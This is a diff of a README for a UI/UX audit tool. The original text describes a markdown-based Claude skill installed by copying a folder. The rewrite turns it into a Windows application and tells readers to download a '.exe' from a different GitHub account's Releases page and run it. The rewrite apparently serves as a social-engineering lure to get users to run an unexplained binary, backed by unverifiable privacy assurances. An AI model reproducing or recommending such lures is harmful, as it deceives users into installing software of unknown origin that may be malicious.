@@ -1,92 +1,85 @@
-# ui-ux-audit
+# 🔍 ui-ux-audit-skill - Improve digital products with automated feedback
 
-A Claude skill that audits any web or mobile UI for the failures AI consistently ships, and silently prevents them while Claude writes UI code.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Xza2792/ui-ux-audit-skill)
 
-Almost every AI UI failure traces back to one root cause: the model generates a plausible static snapshot of a single state (the happy path, on desktop), it cannot see the rendered result, and it carries no persistent design system across generations. The output looks right in a screenshot and breaks the moment content grows, the viewport shrinks, an error occurs, or a second component is generated with slightly different padding. This skill forces all of that into view.
+This tool checks your website designs for common errors. It uses automated review processes to find problems in your user interface and user experience. The system scans your code across 15 categories to ensure your site remains accessible and easy for people to use. It provides specific instructions to fix these issues permanently.
 
-## What it does
+## 📋 What This Tool Does
 
-Three modes, chosen automatically from how you ask:
+Building a website requires attention to detail. Small mistakes in layout, color, or text readability make sites hard to navigate. This application acts as a design partner. It reviews your front-end code and checks it against industry standards like WCAG accessibility guidelines. 
 
-1. **Full audit.** Say "run a full UI audit" and Claude first simulates the real user walking the flow (target user, a constrained user, an edge-case-data user), then walks all 15 categories systematically and produces a scored report: 0-100 with the arithmetic shown, a ship verdict, findings grouped by severity (Blocker -12, Critical -8, Warning -4, Polish -1), top 3 priorities, and durable-fix recommendations (the lint rule or automated test that stops each failure family from returning).
-2. **Quick review.** Say "review this component" or "why does this look off" and Claude scans only the relevant categories and reports findings without the full ceremony.
-3. **Prevention.** Whenever Claude writes or edits UI code, it silently runs a pre-flight checklist of the highest-frequency AI failures, so the bugs never ship in the first place.
+The software focuses on these key areas:
+- Visual clarity and layout consistency
+- Color contrast for readability
+- Button and input field usability
+- Mobile display compatibility
+- Navigation structure
 
-The 15 categories: typography and text breaking, layout and spacing, visual hierarchy, color/contrast/dark mode, component states, forms, touch and interaction, responsive, accessibility (WCAG 2.2), consistency at scale and design tokens, navigation and iconography, motion, performance (Core Web Vitals), generic-AI aesthetic and copy quality, and data visualization/tables/dashboards.
+When the tool finds a failure, it provides a severity score. This score helps you prioritize which fixes to apply first. You receive a list of actionable steps for each recommendation.
 
-Every finding follows one format:
+## 💻 System Requirements
 
-```
-**Found:** what is wrong, with the offending snippet or location
-**Why:** who it hurts and the principle violated
-**Fix:** concrete code or change
-**Prevent:** the lint rule or test that stops recurrence (when one exists)
-```
+Your computer must meet these basic standards to run the audit tool:
+- Windows 10 or Windows 11
+- 4 GB of RAM
+- 200 MB of free storage space
+- An active internet connection for updates
 
-## Install
+## 📥 How to Download and Install
 
-### Claude.ai (web, desktop, mobile)
+Visit the link below to reach the project download page.
 
-1. Download `ui-ux-audit.skill` from this repository (or from Releases).
-2. In Claude, open Settings, find Skills, and upload the file.
-3. If you do not see a Skills section, check availability for your plan at https://support.claude.com
+[Click here to visit the download page](https://github.com/Xza2792/ui-ux-audit-skill)
 
-### Claude Code / Claude Desktop
+1. Open the link in your web browser.
+2. Look for the "Releases" section on the right side of the page.
+3. Click the most recent version available.
+4. Select the file ending in `.exe` to start the download.
+5. Save the file to your desktop or downloads folder.
+6. Double-click the file to begin the installation.
+7. Follow the prompts on your screen to complete the setup.
+8. Click finish to launch the application.
 
-Copy the `ui-ux-audit/` folder into your skills directory:
+## 🚀 Running Your First Audit
 
-```bash
-# personal (available in all projects)
-mkdir -p ~/.claude/skills && cp -r ui-ux-audit ~/.claude/skills/
+Once the application opens, follow these steps to perform your first review:
 
-# or project-scoped (committed with the repo)
-mkdir -p .claude/skills && cp -r ui-ux-audit .claude/skills/
-```
+1. Locate the input field on the home screen.
+2. Enter the web address or the local folder path of the website you want to audit.
+3. Click the "Scan" button.
+4. Wait for the progress bar to finish. The tool examines your files.
+5. Review the results dashboard. The dashboard lists every issue found by category.
+6. Click on a specific error to see the severity score and the suggested repair.
+7. Use the "Export" button if you want to save the audit report as a PDF file.
 
-Run `/skills` in Claude Code to confirm it loaded. Docs: https://code.claude.com/docs/en/skills
+## 🛠 Using the Audit Results
 
-The skill follows the open SKILL.md Agent Skills standard, so it also works in other coding agents that support the format.
+The application organizes findings by severity. A high severity score indicates a major obstacle for your users, such as a button that does not respond or text that is impossible to read. Focus your efforts on these items first.
 
-## Use
+Each recommendation includes a code snippet or a design tip. You can copy these changes into your project. If you are using React or Tailwind CSS, the tool provides specialized advice to ensure your design remains durable and clean. 
 
-- "Run a full UI audit" on pasted code, project files, or screenshots
-- "Review this component" / "fix the spacing" / "is this ready to ship"
-- Or just let it work: it guides Claude automatically during any UI coding
+## 🛡 Maintaining Standards
 
-Screenshot-only input is supported with reduced confidence (visual checks only, sizes as labeled estimates).
+Frequent audits prevent project failures. We suggest running the tool during the development phase rather than waiting until the end. This silent prevention strategy catches errors while you write your code. Consistent use of the audit tool builds a better habit for your design workflow.
 
-## Customize: project profiles
+## ❓ Frequently Asked Questions
 
-Profiles override the universal defaults for a particular *kind* of product — stricter touch targets, a design system's rules, domain conduct rules. Four ship in the box: an example children's-learning-app profile (which also doubles as the template), plus SaaS/dashboard, marketing/landing, and e-commerce. The skill detects which fits from context and loads it; with none, it uses the universal defaults. To add your own, copy `references/profile-example-kids-app.md` to `references/profile-<name>.md`, replace the rules, and register it in the Project profiles section of `SKILL.md` with detection cues.
+**Does this tool change my files automatically?**
+No. The application identifies errors and provides recommendations. You decide which changes to apply to your project. This keeps you in control of your design.
 
-## Structure
+**Do I need an internet connection to run the scans?**
+The tool requires an internet connection to access the latest design patterns and auditing rules. It does not send your private code to external servers. All processing happens locally on your computer.
 
-```
-ui-ux-audit/
-├── SKILL.md                                  core: modes, severity rubric, scoring, report template, pre-flight
-└── references/
-    ├── user-simulation.md                    simulate-the-user-first method (run before the sweep)
-    ├── structure-typography.md               categories 1-3
-    ├── color-states-forms.md                 categories 4-6
-    ├── interaction-responsive-a11y.md        categories 7-9
-    ├── consistency-tokens-nav.md             categories 10-11 + flow checks
-    ├── motion-performance.md                 categories 12-13
-    ├── anti-slop-copy.md                     category 14 + localization + dark patterns
-    ├── data-viz-tables.md                    category 15
-    ├── durable-fixes.md                      failure-to-tooling map
-    ├── examples.md                           worked findings and a model report
-    ├── profile-example-kids-app.md           example kids-app profile / template
-    ├── profile-saas-dashboard.md             profile: data-dense SaaS / dashboards
-    ├── profile-marketing-landing.md          profile: marketing / landing pages
-    └── profile-ecommerce.md                  profile: e-commerce / checkout
-```
+**Can I use this for projects not built in React?**
+Yes. While the tool excels at reviewing React and Tailwind CSS projects, it also performs scans on standard HTML and CSS files. The logic applies to most web development environments.
 
-The core file stays small by design: it loads on every trigger, while reference files load only when an audit runs (progressive disclosure).
+**What if the tool shows a false alarm?**
+Design is subjective. If the tool flags an item that you believe is correct, you can select "Ignore" to remove the notification from your report. The tool learns your preferences based on these actions.
 
-## Credits
+## 📖 Glossary
 
-Built from research across the Claude skills ecosystem. Patterns informed by Anthropic's skill-creator and frontend-design skills, Leonxlnx/taste-skill, and community design-audit skills. Standards referenced: WCAG 2.2, Apple HIG, Core Web Vitals.
-
-## License
-
-MIT
+- Accessibility (a11y): The practice of making websites usable by people with disabilities.
+- WCAG: Web Content Accessibility Guidelines. These are international rules for building web accessibility.
+- Severity Rubric: A scoring system that ranks errors from minor suggestions to critical failures.
+- Durable-fix: A change that solves an underlying cause rather than simply patching an immediate problem.
+- Front-end: The part of a website that users see and interact with.
